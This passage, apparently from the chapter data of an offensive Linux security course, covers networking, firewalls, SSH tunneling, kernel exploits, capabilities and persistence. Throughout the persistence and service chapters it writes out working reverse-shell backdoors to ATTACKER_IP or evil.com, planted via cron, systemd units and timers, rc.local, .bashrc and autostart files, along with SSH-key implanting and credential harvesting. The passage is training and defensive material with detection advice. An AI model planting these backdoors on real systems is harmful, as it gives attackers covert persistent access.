to confuse timeline analysis. Log redirection: Using custom scripts to divert logging into attacker-controlled files. 4. Practice Task Inspect authentication failures: grep \"Failed\" /var/log/auth.log Monitor system events real-time: tail -f /var/log/syslog Correlate logs with potential attack stages using timestamps. Pentester Tip Logs are the eyes of defenders. Tampering with them is powerful, but leaves its own trace - stealth matters."},{"kind":"chapter","number":15,"order":15,"href":"chapters/15-networking-fundamentals-for-hackers.html","slug":"15-networking-fundamentals-for-hackers","page":"15-networking-fundamentals-for-hackers.html","title":"Networking Fundamentals for Hackers","short":"Networking","summary":"Read interfaces, routes, sockets and live connections from the command line.","part":"access","partNum":"03","partName":"Access and network","readMinutes":2,"words":168,"sections":6,"codeBlocks":1,"headings":[{"id":"objective","text":"Objective","level":2},{"id":"1-key-networking-commands","text":"1. Key Networking Commands","level":2},{"id":"2-monitoring-connections","text":"2. Monitoring Connections","level":2},{"id":"3-attacker-use-cases","text":"3. Attacker Use Cases","level":2},{"id":"4-practice-task","text":"4. Practice Task","level":2},{"id":"pentester-tip","text":"Pentester Tip","level":2}],"text":"Objective Understand essential Linux networking commands, how attackers enumerate networks, and common techniques to monitor traffic. 1. Key Networking Commands ifconfig or ip a → Show network interfaces ping \u003ctarget> → Test connectivity netstat -tulnp or ss -tulnp → Show listening ports traceroute \u003ctarget> → Trace route to a host dig \u003cdomain> → DNS lookup curl ifconfig.me → Reveal your public IP 2. Monitoring Connections ss -tnp # Show active TCP connections netstat -antp # Alternative view tcpdump -i eth0 # Capture packets on eth0 Pentesters use these to spot suspicious connections or sniff credentials. 3. Attacker Use Cases Identify open ports for lateral movement Map internal network routes Discover DNS misconfigurations Exfiltrate data over covert connections 4. Practice Task List all open ports on your system using ss -tulnp. Use tcpdump to capture packets while browsing. Try dig to enumerate DNS records for a domain. Pentester Tip Networking knowledge is the backbone of hacking. Every exploit travels over the wire - know the wire, control the attack."},{"kind":"chapter","number":16,"order":16,"href":"chapters/16-firewalls-and-packet-filtering.html","slug":"16-firewalls-and-packet-filtering","page":"16-firewalls-and-packet-filtering.html","title":"Firewalls and Packet Filtering (iptables and ufw)","short":"Firewalls","summary":"Inspect iptables and UFW rules and think in terms of allowed and denied paths.","part":"access","partNum":"03","partName":"Access and network","readMinutes":6,"words":670,"sections":10,"codeBlocks":10,"headings":[{"id":"1-understanding-iptables","text":"1. Understanding iptables","level":2},{"id":"viewing-rules","text":"Viewing rules","level":3},{"id":"adding-rules","text":"Adding rules","level":3},{"id":"2-ufw-uncomplicated-firewall","text":"2. UFW - Uncomplicated Firewall","level":2},{"id":"basic-commands","text":"Basic commands","level":3},{"id":"3-attacker-s-view","text":"3. Attacker’s View","level":2},{"id":"4-real-world-pentesting-scenarios","text":"4. Real-World Pentesting Scenarios","level":2},{"id":"5-practical-tasks","text":"5. Practical Tasks","level":2},{"id":"advanced-nftables-xdp-and-modern-filtering","text":"Advanced: nftables, XDP and modern filtering","level":2},{"id":"6-key-takeaways","text":"6. Key Takeaways","level":2}],"text":"Firewalls are one of the first layers of defense in any Linux system. As hackers or pentesters, understanding how they work - and how to bypass them - is essential. 1. Understanding iptables iptables is the traditional firewall tool in Linux. It controls the traffic that flows in and out of the system. Tables: filter → default, used for packet filtering nat → used for network address translation (e.g., port forwarding) mangle → advanced packet modification Chains: INPUT → incoming traffic OUTPUT → outgoing traffic FORWARD → traffic routed through the system Viewing rules iptables -L -n -v Adding rules iptables -A INPUT -p tcp --dport 22 -j ACCEPT # Allow SSH iptables -A INPUT -j DROP # Drop everything else 2. UFW - Uncomplicated Firewall ufw is a simpler frontend to iptables. Basic commands ufw status ufw enable ufw allow 80/tcp ufw deny 23/tcp ufw default deny incoming ufw default allow outgoing This simplifies firewall management for administrators. 3. Attacker’s View Firewalls create barriers, but attackers always look for misconfigurations: Port scanning: nmap -Pn -p- target.com (-Pn skips ICMP echo, useful if ping is blocked.) Tunneling: Attackers often tunnel traffic to bypass firewalls: ssh -D 9050 user@target.com (Creates a SOCKS proxy.) Outbound traffic: Even if inbound is locked, many firewalls allow outbound. This can be abused for reverse shells: bash -i >& /dev/tcp/attacker-ip/4444 0>&1 4. Real-World Pentesting Scenarios Misconfigured firewalls with ACCEPT rules before restrictive ones. Firewalls allowing “trusted” IPs that attackers can spoof. Services bound to 0.0.0.0 but intended only for localhost. 5. Practical Tasks List all current firewall rules on your machine. iptables -L -n -v Block SSH access (port 22) with iptables, then try to connect. Using ufw, configure your system to: Allow HTTP (80) and HTTPS (443). Deny all other inbound connections. Simulate bypass: Run nmap with -Pn against a target with ICMP blocked. Advanced: nftables, XDP and modern filtering iptables still works through the iptables-nft compatibility layer, but new deployments should use nftables. It provides one ruleset for IPv4, IPv6, ARP and bridges, atomic updates, sets, maps and better performance with large blocklists. A minimal default-deny input policy: sudo nft add table inet filter sudo nft 'add chain inet filter input { type filter hook input priority 0; policy drop; }' sudo nft add rule inet filter input iif lo accept sudo nft add rule inet filter input ct state established,related accept sudo nft add rule inet filter input tcp dport '{ 22, 443 }' accept sudo nft add rule inet filter input ip protocol icmp accept sudo nft list ruleset Use sets for blocklists and rate limits. Rule order matters, so place a rate-limited rule before a broad accept: sudo nft add set inet filter blocklist '{ type ipv4_addr; flags timeout; }' sudo nft add element inet filter blocklist '{ 203.0.113.10 timeout 1h }' sudo nft add rule inet filter input ip saddr @blocklist drop sudo nft add rule inet filter input tcp dport 2222 limit rate 10/minute accept For high-throughput filtering, XDP runs an eBPF program at the driver ingress path before the kernel allocates an skb. It is useful for DDoS dropping and packet sampling, but it is not a replacement for stateful firewalling. Inspect loaded programs with: sudo bpftool prog list sudo bpftool net ip link show dev eth0 bpfilter can translate iptables rules into BPF, and tc eBPF programs handle egress shaping and filtering. In Kubernetes, NetworkPolicy and eBPF-based CNIs such as Cilium move enforcement closer to the pod. Operational notes: Keep rules in version-controlled files and apply them with nft -f. Use nft monitor trace with a trace rule in a lab; tracing every packet is expensive. Test changes over a serial console or with a rollback timer on remote hosts. Default-deny inbound, but do not assume outbound is safe. Egress filtering limits data theft and command-and-control. 6. Key Takeaways Firewalls filter traffic using rules in tables/chains. iptables gives fine control; ufw simplifies management. Attackers focus on misconfigurations, tunneling, and outbound traffic. Always test firewall behavior during pentests."},{"kind":"chapter","number":17,"order":17,"href":"chapters/17-ssh-and-tunneling.html","slug":"17-ssh-and-tunneling","page":"17-ssh-and-tunneling.html","title":"Secure Shell (SSH) and Tunneling Tricks","short":"SSH tunneling","summary":"Harden SSH and build local, remote and dynamic tunnels for authorized testing.","part":"access","partNum":"03","partName":"Access and network","readMinutes":4,"words":286,"sections":8,"codeBlocks":8,"headings":[{"id":"ssh-basics","text":"SSH Basics","level":2},{"id":"ssh-hardening-defense","text":"SSH Hardening (Defense)","level":2},{"id":"ssh-tunneling-offense-and-pentest-use","text":"SSH Tunneling (Offense & Pentest Use)","level":2},{"id":"local-port-forwarding","text":"Local Port Forwarding","level":3},{"id":"remote-port-forwarding","text":"Remote Port Forwarding","level":3},{"id":"dynamic-proxy-socks","text":"Dynamic Proxy (SOCKS)","level":3},{"id":"pentester-tips","text":"Pentester Tips","level":2},{"id":"exercises","text":"Exercises","level":2}],"text":"SSH is essential for system administrators and hackers alike. It provides secure remote access, file transfer, and powerful tunneling capabilities that can be abused by attackers or used by pentesters for stealth operations. SSH Basics # Connect to a server ssh user@target # Copy a file to a remote host scp file.txt user@target:/tmp/ # Generate SSH keys ssh-keygen -t ed25519 SSH Hardening (Defense) Disable root login Edit /etc/ssh/sshd_config: PermitRootLogin no Use key-based authentication only ssh-keygen -t ed25519 Add your public key to ~/.ssh/authorized_keys. Change default port (avoid 22) Port 2222 Limit users AllowUsers alice bob Use Fail2Ban / UFW to block brute-force attacks. SSH Tunneling (Offense & Pentest Use) Attackers and pentesters often use SSH to bypass firewalls and pivot into internal networks. SSH tunneling is a method of transporting arbitrary networking data over an encrypted SSH connection. It can be used to add encryption to legacy applications. It can also be used to implement VPNs (Virtual Private Networks) and access intranet services across firewalls. Local Port Forwarding Access remote services via localhost: ssh -L 8080:localhost:3306 user@target Now localhost:8080 forwards traffic to target’s MySQL. Remote Port Forwarding Expose local services to an attacker: ssh -R 4444:localhost:22 attacker@evil.com Attacker connects back to victim. Dynamic Proxy (SOCKS) Turn SSH into a SOCKS proxy: ssh -D 9050 user@target Then configure proxychains to tunnel traffic. Pentester Tips Firewalls often allow outbound SSH (22, 443). Exploit this for C2 or pivoting. Use SSH tunnels to access databases, intranet sites, or restricted services. Combine proxychains + SSH dynamic proxy for stealthy browsing. Exercises Harden your SSH server: disable root login & enforce keys. Create a local port forward to access a blocked service. Use SSH dynamic proxy with proxychains to browse internally."},{"kind":"chapter","number":18,"order":18,"href":"chapters/18-linux-kernel-and-exploit-basics.html","slug":"18-linux-kernel-and-exploit-basics","page":"18-linux-kernel-and-exploit-basics.html","title":"Linux Kernel and Exploit Basics","short":"Kernel exploits","summary":"Check kernel exposure, evaluate exploit risk and treat kernel exploits with care.","part":"access","partNum":"03","partName":"Access and network","readMinutes":5,"words":571,"sections":9,"codeBlocks":6,"headings":[{"id":"introduction","text":"Introduction","level":2},{"id":"checking-kernel-version","text":"Checking Kernel Version","level":2},{"id":"why-kernel-version-matters","text":"Why Kernel Version Matters","level":2},{"id":"examples","text":"Examples:","level":3},{"id":"automating-kernel-exploit-enumeration","text":"Automating Kernel Exploit Enumeration","level":2},{"id":"compiling-and-running-exploits","text":"Compiling & Running Exploits","level":2},{"id":"pentester-notes","text":"Pentester Notes","level":2},{"id":"advanced-modern-kernel-exploitation-and-mitigations","text":"Advanced: Modern kernel exploitation and mitigations","level":2},{"id":"summary","text":"Summary","level":2}],"text":"Introduction The Linux kernel is the core component of the operating system, responsible for managing memory, processes, devices, and system calls. Since it runs in ring 0 (the highest privilege level), exploiting kernel vulnerabilities can allow attackers to gain full control of the system. Checking Kernel Version Attackers and pentesters start by fingerprinting the kernel version to identify potential vulnerabilities. uname -r # Kernel version uname -a # Full system info cat /proc/version Example output: 5.4.0-77-generic Why Kernel Version Matters Each kernel version may contain known privilege escalation vulnerabilities. Once identified, attackers can look them up in exploit databases such as: Exploit-DB GitHub repositories with public PoCs CVE databases Examples: Dirty COW (CVE-2016-5195): Allows writing to read-only memory. OverlayFS (CVE-2015-1328): Privilege escalation in Ubuntu-based kernels. Automating Kernel Exploit Enumeration Several tools can enumerate kernel vulnerabilities and privilege escalation paths automatically: # Linux Exploit Suggester ./linux-exploit-suggester.sh # Linux Smart Enumeration ./lse.sh These scripts compare system/kernel info with known vulnerabilities. Compiling & Running Exploits Most public exploits are written in C. Example workflow: gcc exploit.c -o exploit ./exploit Warning: Exploits should only be run in lab environments (VMs, containers) for testing and learning. Running exploits on production systems is dangerous and illegal without authorization. Pentester Notes Kernel exploits are noisy and may crash systems. Always attempt safer privilege escalation methods (misconfigured sudo, file permissions, PATH hijacking) before trying kernel exploits. If kernel exploits are the only option, ensure proper OPSEC and persistence planning. Advanced: Modern kernel exploitation and mitigations Modern kernels expose a much smaller unprivileged attack surface than older guides assume. Check mitigations before chasing a version-specific exploit: uname -r grep -E 'CONFIG_(RANDOMIZE_BASE|X86_SMEP|X86_SMAP|PAGE_TABLE_ISOLATION|BPF|BPF_SYSCALL|IO_URING|USER_NS|SECCOMP|SECURITY_LANDLOCK)' /boot/config-$(uname -r) 2>/dev/null sysctl kernel.kptr_restrict kernel.dmesg_restrict kernel.unprivileged_bpf_disabled 2>/dev/null sysctl kernel.io_uring_disabled 2>/dev/null sysctl kernel.unprivileged_userns_clone 2>/dev/null Current hardening primitives: Landlock lets an unprivileged process restrict its own filesystem, network, capability and namespace access. Current kernels support network rules and capability/namespace restrictions; older kernels only cover filesystem access. seccomp filters syscalls and is the basis of container runtime profiles. mseal (Linux 6.10+) prevents later changes to memory mappings, complicating some exploitation primitives. io_uring is powerful but has a history of kernel bugs; many distributions now restrict unprivileged use. unprivileged_bpf_disabled=2 blocks unprivileged BPF loading. eBPF verifier bugs remain a high-value target when BPF is available. Recent case studies: CVE-2022-0847 \"Dirty Pipe\" abused pipe buffers to overwrite read-only file data on Linux 5.8 and later. CVE-2024-1086 is a use-after-free in nf_tables that affected kernels from 3.15 through 6.8 and was exploited for local privilege escalation. Container and namespace bugs often provide a shorter path than a full kernel exploit, especially when CAP_SYS_ADMIN, host mounts or privileged devices are exposed. Method: Enumerate kernel, config, mitigations, user namespaces, BPF and io_uring. Prefer logic bugs in sudo, polkit, services and file permissions. Use linux-exploit-suggester only as a lead generator; verify the exact patch level. Test in a snapshot, never on a production host. Capture dmesg and a core before and after; kernel crashes destroy evidence. Hardening examples, after validating application compatibility: sudo sysctl -w kernel.kptr_restrict=2 sudo sysctl -w kernel.dmesg_restrict=1 sudo sysctl -w kernel.unprivileged_bpf_disabled=2 sudo sysctl -w kernel.io_uring_disabled=2 Persist the settings in /etc/sysctl.d/99-hardening.conf, then run sudo sysctl --system. Do not copy public exploit code into a production environment. Summary Kernel runs at the highest privilege level. Fingerprinting kernel version is the first step. Exploits exist for specific versions (Dirty COW, OverlayFS, etc.). Use tools like lse.sh or linux-exploit-suggester.sh to automate checks. Compile and test exploits in safe environments."},{"kind":"chapter","number":19,"order":19,"href":"chapters/19-linux-persistence-techniques.html","slug":"19-linux-persistence-techniques","page":"19-linux-persistence-techniques.html","title":"Linux Persistence Techniques","short":"Persistence","summary":"Compare common persistence mechanisms and the evidence each leaves behind.","part":"persistence","partNum":"04","partName":"Persistence and isolation","readMinutes":3,"words":264,"sections":7,"codeBlocks":5,"headings":[{"id":"introduction","text":"Introduction","level":2},{"id":"1-ssh-key-persistence","text":"1. SSH Key Persistence","level":2},{"id":"2-crontab-persistence","text":"2. Crontab Persistence","level":2},{"id":"3-systemd-service-backdoor","text":"3. Systemd Service Backdoor","level":2},{"id":"4-bashrc-profile-hijacking","text":"4. Bashrc / Profile Hijacking","level":2},{"id":"5-path-hijacking","text":"5. PATH Hijacking","level":2},{"id":"summary","text":"Summary","level":2}],"text":"Introduction Persistence is the ability of an attacker to maintain access to a compromised system, even after reboots or patches. Understanding persistence methods is critical for red teamers, penetration testers, and defenders alike. 1. SSH Key Persistence Attackers often install their SSH public key to maintain long-term access. mkdir -p ~/.ssh echo \"attacker_public_key\" >> ~/.ssh/authorized_keys chmod 600 ~/.ssh/authorized_keys This allows passwordless login at any time. Defenders should regularly check for unauthorized entries in ~/.ssh/authorized_keys. 2. Crontab Persistence Attackers abuse cron jobs to execute malicious commands automatically. (crontab -l ; echo \"@reboot /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\") | crontab - This ensures a reverse shell starts at every reboot. Defenders should monitor /var/spool/cron/ and user crontabs. 3. Systemd Service Backdoor Attackers can create persistent malicious services. cat \u003c\u003c EOF > /etc/systemd/system/backdoor.service [Unit] Description=Backdoor Service [Service] ExecStart=/bin/bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1 [Install] WantedBy=multi-user.target EOF systemctl enable backdoor.service systemctl start backdoor.service The service runs on boot, maintaining persistence. Defenders should audit /etc/systemd/system/ for unusual services. 4. Bashrc / Profile Hijacking Malicious commands can be hidden in .bashrc or /etc/profile. echo \"/bin/bash -i >& /dev/tcp/ATTACKER_IP/6666 0>&1\" >> ~/.bashrc This executes the payload whenever a new shell is started. Defenders should monitor .bashrc and /etc/profile for unauthorized changes. 5. PATH Hijacking Attackers place trojanized binaries earlier in the PATH variable. echo 'export PATH=/home/user/.bin:$PATH' >> ~/.bashrc Example: dropping a fake ls or sudo in /home/user/.bin. Defenders should validate $PATH and inspect unusual binary directories. Summary Persistence ensures attackers maintain access across reboots. Common persistence vectors: SSH keys, crontabs, systemd services, bashrc hijacking, PATH manipulation. Defenders should routinely audit persistence points."},{"kind":"chapter","number":20,"order":20,"href":"chapters/20-linux-services-and-daemon-exploitation.html","slug":"20-linux-services-and-daemon-exploitation","page":"20-linux-services-and-daemon-exploitation.html","title":"Linux Services and Daemon Exploitation","short":"Service exploitation","summary":"Enumerate daemons, inspect service definitions and review exposed attack surfaces.","part":"persistence","partNum":"04","partName":"Persistence and isolation","readMinutes":2,"words":255,"sections":7,"codeBlocks":3,"headings":[{"id":"introduction","text":"Introduction","level":2},{"id":"enumerating-services","text":"Enumerating Services","level":2},{"id":"why-services-matter-for-attackers","text":"Why Services Matter for Attackers","level":2},{"id":"common-examples-of-service-exploits","text":"Common Examples of Service Exploits","level":2},{"id":"credential-harvesting-from-services","text":"Credential Harvesting from Services","level":2},{"id":"pentester-notes","text":"Pentester Notes","level":2},{"id":"summary","text":"Summary","level":2}],"text":"Introduction Services (daemons) are background processes that provide functionality such as web servers, databases, or remote access. Misconfigured services are one of the most common privilege escalation and lateral movement vectors on Linux. Enumerating Services Attackers first identify which services are running and how they are configured. # List active services systemctl list-units --type=service # Check running processes ps aux | grep root # List listening ports netstat -tulnp ss -tulnp Why Services Matter for Attackers Services running as root are prime targets. Misconfigurations can lead to remote code execution (RCE) or privilege escalation. Configuration files may store cleartext credentials. Common Examples of Service Exploits Apache/NGINX: If /var/www/html is writable, attackers can drop a webshell. MySQL: Default or weak root passwords; credentials stored in /etc/mysql/my.cnf. Redis: Can be exploited to write SSH keys into /root/.ssh/authorized_keys → root access. Systemd Services: Writable unit files can be hijacked to execute attacker code. # Example: hijacking a service file echo -e \"[Service] ExecStart=/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\" >> /etc/systemd/system/vulnerable.service systemctl daemon-reload systemctl start vulnerable.service Credential Harvesting from Services Configuration files often contain valuable credentials: cat /etc/mysql/my.cnf cat /var/www/html/config.php Attackers can reuse these credentials for lateral movement. Pentester Notes When assessing Linux services: Look for services running as root unnecessarily. Check file permissions of service definitions in /etc/systemd/system/. Audit web/database configs for hardcoded or weak credentials. Validate that services are not exposed on 0.0.0.0 unless required. Summary Services/daemons are critical attack surfaces. Misconfigured services often lead to privilege escalation. Service files, configs, and running permissions should always be audited."},{"kind":"chapter","number":21,"order":21,"href":"chapters/21-linux-capabilities-and-exploitation.html","slug":"21-linux-capabilities-and-exploitation","page":"21-linux-capabilities-and-exploitation.html","title":"Linux Capabilities and Exploitation (Beyond SUID)","short":"Capabilities","summary":"Read capability sets, compare them with SUID and identify excessive grants.","part":"persistence","partNum":"04","partName":"Persistence and isolation","readMinutes":6,"words":823,"sections":11,"codeBlocks":8,"headings":[{"id":"objective","text":"Objective","level":2},{"id":"1-what-are-linux-capabilities","text":"1. What are Linux Capabilities?","level":2},{"id":"2-how-capabilities-differ-from-suid","text":"2. How Capabilities Differ from SUID","level":2},{"id":"3-enumerating-file-capabilities","text":"3. Enumerating File Capabilities","level":2},{"id":"4-viewing-process-capabilities","text":"4. Viewing Process Capabilities","level":2},{"id":"5-assigning-or-removing-capabilities-setcap","text":"5. Assigning or Removing Capabilities (setcap)","level":2},{"id":"6-attack-scenarios-and-abuse-patterns","text":"6. Attack Scenarios & Abuse Patterns","level":2},{"id":"7-practical-hands-on-tasks-do-in-a-lab-vm","text":"7. Practical Hands-On Tasks (Do in a lab VM)","level":2},{"id":"8-defensive-measures-and-hardening","text":"8. Defensive Measures & Hardening","level":2},{"id":"9-study-and-further-reading","text":"9. Study & Further Reading","level":2},{"id":"safety-and-ethics-note","text":"Safety & Ethics Note","level":2}],"text":"Objective Introduce Linux file capabilities, how they differ from SUID/SGID, how attackers may abuse capabilities (e.g., setcap), and defensive measures. This lesson is practical and aims to teach safe enumeration, identification, and mitigation strategies. 1. What are Linux Capabilities? Traditional Unix privilege model is binary: root (UID 0) vs non-root. Linux capabilities break up root privileges into discrete capabilities (e.g., CAP_NET_ADMIN, CAP_SYS_ADMIN, CAP_SETUID). They can be granted to filesystem objects so that specific privileges are available to processes executing that binary - without needing full root UID. Capabilities are attached to files (file capabilities) and processes (inherited when executing a file that has them). Common capability names you’ll see: cap_net_raw / CAP_NET_RAW - raw sockets (ping, sniffing) cap_net_bind_service - bind to ports \u003c1024 without root cap_sys_admin - broad, powerful (mounting, namespaces, loopback) cap_setuid / CAP_SETUID - change UID (can help escalate) cap_dac_read_search - bypass file read/search restrictions 2. How Capabilities Differ from SUID SUID: makes an executable run with the file owner's UID (often root). It elevates all privileges the root user has - blunt and dangerous. Capabilities: grant specific privileges. More granular and (in theory) safer - but still dangerous when misapplied. Example: ping historically required SUID root; modern distros often use cap_net_raw+ep on /bin/ping instead of SUID root. 3. Enumerating File Capabilities Use getcap (from libcap) to list file capabilities. # Check a specific binary getcap /usr/bin/ping # Recursively search the filesystem for files with capabilities getcap -r / 2>/dev/null | grep -v '^$' Example output: /usr/bin/ping = cap_net_raw+ep /usr/bin/somebin = cap_sys_admin,cap_dac_read_search+ep +ep means the effective and permitted bits are set. 4. Viewing Process Capabilities Once a process runs an executable with capabilities, the process has those capabilities. Inspect /proc/\u003cPID>/status: # Look for CapEff, CapPrm fields grep CapEff /proc/$(pgrep ping)/status There are tools (e.g., capsh) that can translate capability hex masks into human-readable names. 5. Assigning or Removing Capabilities (setcap) (Use with caution - only on test systems.) # Grant net_raw to ping (example; many distros already do this) sudo setcap cap_net_raw+ep /usr/bin/ping # Remove all capabilities from a file sudo setcap -r /usr/bin/ping # Show current cap settings again getcap /usr/bin/ping Note: Capabilities persist on the file - not tied to current processes. A file with capabilities will pass them to future processes executed from that file. 6. Attack Scenarios & Abuse Patterns Capabilities can be abused to escalate privileges or bypass restrictions without SUID. Here are representative attack patterns (for education/testing): cap_net_bind_service (+ep) on a custom binary allows binding to low ports (e.g., 80) without root. An attacker might replace such a binary or use it to host a backdoor that appears “legitimate.” cap_dac_read_search allows bypassing file read/search DAC restrictions - attackers can read files they otherwise could not. cap_setuid paired with writable or replacable binaries can be abused to run as other users. cap_sys_admin is very powerful: mounting filesystems, performing namespace escapes in some contexts, or manipulating loopback devices. If a file with cap_sys_admin is writable or can be replaced by an attacker, the impact is severe. Combining capabilities: a binary with multiple caps (e.g., cap_dac_read_search,cap_net_admin) can provide a versatile foothold. Common real-world pitfalls: Administrators copy files from untrusted sources and setcap them without auditing. Packages installed to non-standard paths get capabilities but are writable by other users (e.g., /opt/... owned by a user with write access). Forgotten capabilities on developer tools left on production servers. 7. Practical Hands-On Tasks (Do in a lab VM) Find all files with capabilities: getcap -r / 2>/dev/null Inspect a binary with capabilities (example: /usr/bin/ping): getcap /usr/bin/ping ls -l /usr/bin/ping Explain why ping uses cap_net_raw instead of SUID root. Safely remove capabilities on a test binary and observe behavior (use a disposable VM): sudo setcap -r /tmp/testbinary Search for suspicious capabilities in writable paths: getcap -r /opt /tmp /home 2>/dev/null Audit processes that gained capabilities: Run a binary with capability and inspect /proc/\u003cPID>/status to see CapEff. Use capsh --decode= if available. 8. Defensive Measures & Hardening Minimize capability usage: prefer standard, minimal capability sets for services that truly need them. Avoid writable directories with capable binaries: ensure binaries with capabilities are owned by root and not writable by untrusted users. Use package manager capabilities when possible: packaged distributions manage capabilities safely; avoid manual setcap on production unless audited. File integrity monitoring: alert on changes to files in /usr/bin, /sbin, /opt, or any directory where capable binaries live. Use Mandatory Access Controls: AppArmor / SELinux policies can limit the actual operations even if a process has capabilities. Audit regularly: getcap -r / and review for unexpected entries. 9. Study & Further Reading man capabilities / man setcap / man getcap libcap documentation and examples Search for CVE cases where capabilities were abused (for curiosity & defensive learning). Safety & Ethics Note This material is intended for defensive, educational, and authorized penetration testing only. Do not run capability manipulation or exploit actions on systems you do not own or have explicit permission to test."},{"kind":"chapter","number":22,"order":22,"href":"chapters/22-advanced-persistence.html","slug":"22-advanced-persistence","page":"22-advanced-persistence.html","title":"Advanced Persistence: systemd Timers, User Services and Kernel Modules","short":"Advanced persistence","summary":"Inspect systemd timers, user services and kernel modules as persistence surfaces.","part":"persistence","partNum":"04","partName":"Persistence and isolation","readMinutes":7,"words":982,"sections":15,"codeBlocks":7,"headings":[{"id":"objective","text":"Objective","level":2},{"id":"1-systemd-units-vs-timers","text":"1. systemd Units vs Timers","level":2},{"id":"create-a-persistent-user-service","text":"Create a persistent user service","level":3},{"id":"create-a-timer-that-runs-every-boot-and-hourly","text":"Create a timer that runs every boot and hourly","level":3},{"id":"2-system-wide-systemd-service-persistence","text":"2. System-wide systemd Service Persistence","level":2},{"id":"3-systemd-timers-stealthier-than-cron","text":"3. systemd Timers (stealthier than cron)","level":2},{"id":"4-rc-local-init-scripts-and-legacy-boot-persistence","text":"4. rc.local, init scripts, and legacy boot persistence","level":2},{"id":"5-autostart-desktop-entries-gui-persistence","text":"5. Autostart Desktop Entries (GUI persistence)","level":2},{"id":"6-kernel-module-dkms-persistence-advanced","text":"6. Kernel Module / DKMS Persistence (advanced)","level":2},{"id":"7-bootloader-and-firmware-persistence-extreme","text":"7. Bootloader & Firmware Persistence (extreme)","level":2},{"id":"8-detection-and-defensive-strategies","text":"8. Detection & Defensive Strategies","level":2},{"id":"9-practical-tasks-lab","text":"9. Practical Tasks (lab)","level":2},{"id":"advanced-modern-persistence-surfaces","text":"Advanced: Modern persistence surfaces","level":2},{"id":"1-ethics-and-safety","text":"1 Ethics & Safety","level":2},{"id":"references-and-further-reading","text":"References & Further Reading","level":2}],"text":"Objective Learn advanced persistence techniques attackers use and how defenders can detect and mitigate them. Topics: systemd timers/user services, kernel module loading, rc.local/init scripts, autostart entries, and bootloader/firmware persistence vectors. All examples are for authorized lab use only. 1. systemd Units vs Timers systemd provides flexible persistence through unit files and timers. Timers are the systemd equivalent of cron with more control and stealth. Create a persistent user service # Create service in user unit directory mkdir -p ~/.config/systemd/user cat > ~/.config/systemd/user/backdoor.service \u003c\u003c'EOF' [Unit] Description=User Backdoor Service [Service] ExecStart=/bin/bash -lc 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' Restart=always RestartSec=60 EOF # Enable and start (user-level) systemctl --user daemon-reload systemctl --user enable --now backdoor.service Create a timer that runs every boot and hourly cat > ~/.config/systemd/user/backdoor.timer \u003c\u003c'EOF' [Unit] Description=Run backdoor on boot and hourly [Timer] OnBootSec=1min OnUnitActiveSec=1h [Install] WantedBy=timers.target EOF systemctl --user daemon-reload systemctl --user enable --now backdoor.timer Notes: User-level units persist across reboots and are less likely to be inspected than system units. 2. System-wide systemd Service Persistence System services live in /etc/systemd/system/. Creating a unit requires root - but if you can write to this directory (or a service file is writable), you can achieve root persistence. sudo tee /etc/systemd/system/sys-backdoor.service > /dev/null \u003c\u003c'EOF' [Unit] Description=Sys Backdoor [Service] Type=simple ExecStart=/bin/bash -lc 'bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1' Restart=always RestartSec=30 [Install] WantedBy=multi-user.target EOF sudo systemctl daemon-reload sudo systemctl enable --now sys-backdoor.service 3. systemd Timers (stealthier than cron) Timers show as systemctl list-timers. They can be used to repeatedly execute payloads without using crontab files. Inspect timers: systemctl list-timers --all Timer files locations: /etc/systemd/system/*.timer, /usr/lib/systemd/system/ and user ~/.config/systemd/user/*.timer Stealth tip (attacker): Use OnCalendar with complex expressions to avoid simple periodic detections. 4. rc.local, init scripts, and legacy boot persistence Older systems or compatibility layers still honor /etc/rc.local. Writing to it gives persistence on boot (needs executable bit). echo \"/bin/bash -lc 'bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1'\" | sudo tee -a /etc/rc.local sudo chmod +x /etc/rc.local Similarly, init scripts in /etc/init.d/ can be abused where present. 5. Autostart Desktop Entries (GUI persistence) On desktop systems, .desktop files in ~/.config/autostart/ persist on GUI login. mkdir -p ~/.config/autostart cat > ~/.config/autostart/update.desktop \u003c\u003c'EOF' [Desktop Entry] Type=Application Exec=/bin/bash -lc 'bash -i >& /dev/tcp/ATTACKER_IP/8888 0>&1' Hidden=false NoDisplay=false X-GNOME-Autostart-enabled=true Name=Update Service EOF 6. Kernel Module / DKMS Persistence (advanced) Kernel modules can give deep persistence. Loading a malicious module requires root, but if an attacker has root at any point, they can install a module or modify initramfs to load modules at boot. List loaded modules: lsmod Insert module: sudo insmod evil.ko Persistent install: place .ko in /lib/modules/$(uname -r)/extra/ and run depmod -a Rebuild initramfs if needed: sudo update-initramfs -u (Debian/Ubuntu) DKMS: Dynamic Kernel Module Support can rebuild modules across kernel updates - abusing DKMS allows long-term persistence across kernel upgrades. Danger: Kernel modules run with kernel privileges - misuse can crash the system or create rootkits. Only in lab environments. 7. Bootloader & Firmware Persistence (extreme) GRUB: modifying /etc/default/grub or adding grub scripts can achieve early-boot persistence. Rebuilding grub config (sudo update-grub) applies changes. Firmware (UEFI): Advanced attackers may write to UEFI variables or firmware, but this is highly risky and platform-specific. 8. Detection & Defensive Strategies Monitor for new systemd units: auditd rules watching /etc/systemd/system and ~/.config/systemd/user changes. Watch timer changes: systemctl list-timers --all and alert on unknown timers. File integrity monitoring (AIDE, Tripwire) on: /etc/systemd/, /etc/rc.local, /lib/modules/, /boot/. Monitor kernel module insertions: dmesg, journalctl -k, and modprobe execs. Use auditctl -w /sbin/insmod -p x rules. Restrict write access: ensure only root can write to unit directories and module dirs. DKMS directories and package installations should be monitored and validated. 9. Practical Tasks (lab) Create a user-level systemd service + timer that writes a timestamp to /tmp/persist_test.log every minute. Verify with journalctl --user -u backdoor.service and systemctl --user list-timers. Simulate systemd hijack: create a service in /etc/systemd/system/ on a lab VM and enable it. Observe systemctl daemon-reload and systemctl status outputs. Build a dummy kernel module (example modules are available in kernel module programming tutorials) and insmod it in a disposable VM. Observe lsmod and dmesg output. Check for autostart entries: ls ~/.config/autostart/ and review .desktop files. Advanced: Modern persistence surfaces Persistence is less about adding a line to crontab and more about finding a component that runs before your detection stack. Modern Linux gives an attacker many such components; the defender needs to enumerate them by ownership and change history, not just by filename. High-value surfaces: systemd generators in /etc/systemd/system-generators, /run/systemd/system-generators and /usr/lib/systemd/system-generators. They run early, before normal units, and are often missed by unit-file reviews. User units and lingering: 